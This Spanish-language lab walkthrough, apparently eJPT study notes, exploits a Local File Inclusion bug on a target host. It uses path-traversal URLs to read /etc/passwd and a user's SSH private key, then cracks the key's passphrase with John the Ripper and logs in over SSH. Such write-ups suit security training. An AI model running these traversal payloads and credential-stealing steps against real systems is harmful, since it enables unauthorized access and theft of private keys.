1. Encontramos con **Dirb** un directorio web llamado **"tools"**, entramos y hay una pagina web extraña:
```
dirb http://IP victima
```
![Vulnerabilidad Local File Inclusion 1](ejpt/img/vulnerabilidad-local-file-inclusion-1.png)

2. Vemos el código fuente (**Control + U** o **View Page Source**) de la extraña pagina web:
![Vulnerabilidad Local File Inclusion 4](ejpt/img/vulnerabilidad-local-file-inclusion-4.png)

3. Nos encontramos un comentario sospechoso en el código fuente:
```
check_if_exists.php?doc=keyboard.html
```
![Vulnerabilidad Local File Inclusion 2](ejpt/img/vulnerabilidad-local-file-inclusion-2.png)

4. Añadimos el comentario a la **URL** de esta manera:
```
https://IP_victima/tools/check_if_exists.php?doc=keyboard.html
```
![Vulnerabilidad Local File Inclusion 5](ejpt/img/vulnerabilidad-local-file-inclusion-5.png)

5. Retrocedemos directorios y apuntamos a un archivo interno del servidor (mínimo 6-8 **"/../../../.."**):
```
https://IP_victima/tools/check_if_exists.php?doc=/../../../../../../../../etc/passwd
```
![Vulnerabilidad Local File Inclusion 3](ejpt/img/vulnerabilidad-local-file-inclusion-3.png)
- **Veremos el archivo */etc/passwd* que contiene todos los nombres de usuario de los usuarios locales del servidor.**

6. Como hemos visto, la victima tiene el puerto 22 **(SSH)** abierto, entonces usaremos el archivo **id_rsa** de la victima para entrar en el **SSH** sin necesidad de la contraseña del usuario.

7. Apuntamos al archivo oculto **/home/gh0st/.ssh/id_rsa** de la victima usando un usuario del archivo **/etc/passwd** (en este caso por ejemplo el usuario **gh0st**):
```
https://IP_victima/tools/check_if_exists.php?doc=/../../../../../../../../home/gh0st/.ssh/id_rsa
```
![Vulnerabilidad Local File Inclusion 6](ejpt/img/vulnerabilidad-local-file-inclusion-6.png)

8. Esta es la **llave privada** del protocolo **SSH** de la victima, entonces copiamos el contenido del archivo **/home/gh0st/.ssh/id_rsa** y lo pegamos en un archivo llamado **id_rsa** en nuestro **Kali Linux**:
```
sudo nano id_rsa
```
![Vulnerabilidad Local File Inclusion 7](ejpt/img/vulnerabilidad-local-file-inclusion-7.png)
- ***Control + J* para justificar el texto.**
- **Esta codificada en *Base64*.**

9. Le damos los permisos necesarios al archivo **id_rsa** de nuestro **Kali Linux**:
```
sudo chmod 600 id_rsa
```
![Vulnerabilidad Local File Inclusion 8](ejpt/img/vulnerabilidad-local-file-inclusion-8.png)

11. Extraemos el **hash** de la **llave privada** con **John The Ripper**:
```
sudo ssh2john id_rsa > hash
```
![Vulnerabilidad Local File Inclusion 9](ejpt/img/vulnerabilidad-local-file-inclusion-9.png)

12. Con **John The Ripper** usamos el diccionario **Rockyou.txt** para hacerle **Fuerza Bruta** al **hash** obtenido de la **llave privada**:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![Vulnerabilidad Local File Inclusion 10](ejpt/img/vulnerabilidad-local-file-inclusion-10.png)

13. Usamos el archivo **/home/gh0st/.ssh/id_rsa** para entrar al protocolo **SSH** de la victima con el usuario **gh0st**:
```
sudo ssh -i id_rsa gh0st@IP_victima
```
![Vulnerabilidad Local File Inclusion 11](ejpt/img/vulnerabilidad-local-file-inclusion-11.png)

14. Nos pide un salvoconducto, el salvoconducto es la contraseña que conseguimos haciéndole **Fuerza Bruta** al **hash** del archivo **id_rsa (clave privada)**:
![Vulnerabilidad Local File Inclusion 12](ejpt/img/vulnerabilidad-local-file-inclusion-12.png)
- **El salvoconducto no es la contraseña del usuario *gh0st*, el salvoconducto es una contraseña que pide el protocolo *SSH* para poder utilizar el archivo *id_rsa* para entrar al protocolo *SSH*.**